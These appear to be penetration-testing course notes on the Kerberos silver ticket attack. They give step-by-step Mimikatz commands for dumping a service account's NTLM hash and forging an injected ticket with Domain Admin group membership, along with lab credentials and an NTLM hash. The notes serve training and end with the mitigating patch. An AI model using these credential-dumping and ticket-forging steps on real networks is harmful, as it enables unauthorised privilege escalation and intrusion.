```
	- Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket. However, the user and group permissions in the service ticket are not verified by the application in a majority of environments. In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.
```

- _Privileged Account Certificate (PAC) validation_
    
    - If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller.
        - Fortunately for this attack technique, service applications rarely perform PAC validation.
    - As an example, if we authenticate against an IIS server that is executing in the context of the service account iis_service, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket.
    - With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example, the IIS application) with any permissions we desire. This custom-created ticket is known as a silver ticket3 and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.
    - In this section's example, we'll create a silver ticket to get access to an HTTP SPN resource. As we identified in the previous section, the iis_service user account is mapped to an HTTP SPN. Therefore, the password hash of the user account is used to create service tickets for it. For the purposes of this example, let's assume we've identified that the iis_service user has an established session on CLIENT75.
- Need 3 things to create a silver ticket:
    
    - SPN password hash
    - Domain SID
    - Target SPN
- Example:
    
    - Set up:
        - Let's get straight into the attack by connecting to CLIENT75 via RDP as jeff with the password HenchmanPutridBonbon11.
    - Start:
    - Confirm that our current user has no access to the resource of the HTTP SPN mapped to iis_service.
        - `iwr -UseDefaultCredentials http://web04`
    - Since we are a local Administrator on this machine where iis_service has an established session, we can use Mimikatz to retrieve the SPN password hash (1st info we need)
        - Start PowerShell as Administrator and launch **Mimikatz**:
        - `.\mimikatz
        - `privilege::debug`
        - `sekurlsa::logonpasswords`
    - We can enter **whoami /user** to get the SID of the current user. Alternatively, we could also retrieve the SID of the SPN user account from the output of Mimikatz, since the domain user accounts exist in the same domain. (2nd info we need)
        - `whoami /user`
        - output -> [S-1-5-21-1987370270-658905905-1781884369]-1105  
            -omit RID
    - We'll target the HTTP SPN resource on WEB04 (HTTP/web04.corp.com:80) (3rd info we need)
- Command:
    
    - `kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`
        
        - **kerberos::golden** -> module
            
        - **/sid:** -> domain SID
            
        - **/domain:** -> domain name
            
        - **/target:** -> target where the SPN runs
            
        - **/service:** -> SPN protocol
            
        - **/rc4:** -> NTLM hash of the SPN
            
        - **/ptt** -> allows us to inject the forged ticket into memory
            
        - **/user:** -> an existing domain user
            
        - From the perspective of the IIS application, the current user will be both the built-in local administrator ( Relative Id: 500 ) and a member of several highly-privileged groups, including the Domain Admins group ( Relative Id: 512 )
            
    - Confirm ticket ready to use in memory  
        -`klist`
        
    - Verify
        
        - `iwr -UseDefaultCredentials http://web04`
    - To help find flag add:
        
        - `"| findstr /i OS{"`
        - Actually:
            - `PS C:\Tools> (iwr -UseDefaultCredentials http://web04).content/ | findstr /i "OS{"` <-- display web content through HTTP request
- [Note]:
    
    - It's worth noting that we performed this attack without access to the plaintext password or password hash of this user.
    - Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions.
    - Microsoft created a security patch to update the PAC structure. With this patch in place, the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist.